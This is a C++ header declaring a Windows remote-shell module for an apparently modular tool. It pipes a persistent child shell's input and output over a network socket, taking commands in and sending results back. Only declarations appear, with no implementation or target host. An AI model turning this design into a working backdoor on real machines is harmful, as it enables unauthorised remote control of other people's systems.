#pragma once
#include "module.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <string>
#include <atomic>
#include <thread>
#include <mutex>

#pragma comment(lib, "ws2_32.lib")

class RemoteShell_Module : public Module {
public:
    RemoteShell_Module();
    ~RemoteShell_Module();
    
    const char* name() const override;
    void run() override;
    
    // Remote shell specific methods
    bool startRemoteShell(SOCKET sock);
    void stopRemoteShell();
    bool isShellActive() const;

private:
    std::atomic<bool> shellActive;
    std::thread shellThread;
    SOCKET clientSocket;
    std::mutex socketMutex; // Protect socket operations
    
    // Persistent shell process handles
    HANDLE hChildStdin_Rd, hChildStdin_Wr;
    HANDLE hChildStdout_Rd, hChildStdout_Wr;
    HANDLE hChildStderr_Rd, hChildStderr_Wr;
    PROCESS_INFORMATION processInfo;
    std::mutex processMutex; // Protect process operations
    
    void shellLoop(SOCKET sock);
    bool createShellProcess();
    void cleanupShellProcess();
    std::string executeCommand(const std::string& command);
    std::string readFromPipe(HANDLE hPipe, DWORD timeout = 1000);
    bool sendOutput(SOCKET sock, const std::string& output);
    bool receiveCommand(SOCKET sock, std::string& command);
};
